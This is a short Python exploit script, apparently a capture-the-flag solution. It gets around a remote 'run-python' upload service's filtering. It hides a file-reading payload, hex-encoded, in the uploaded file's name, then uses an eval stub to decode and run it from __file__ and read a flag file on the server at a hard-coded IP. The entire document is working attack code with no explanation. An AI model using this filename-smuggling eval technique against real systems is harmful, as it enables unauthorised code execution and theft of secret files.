import requests

script = "print(open('/very/long/path/to/a/secret/document/with/the/unoriginal/name/flag.txt').read())"
script_hex = script.encode().hex()
eval_script = "eval(bytes.fromhex(__file__[70:]))"

# Save eval to script_hex filename
with open(script_hex, "w") as f:
    f.write(eval_script)
    f.close()

url = "http://206.189.63.87/run-python"
files = {'f': open(script_hex, 'rb')}
r = requests.post(url, files=files)
print(r.text)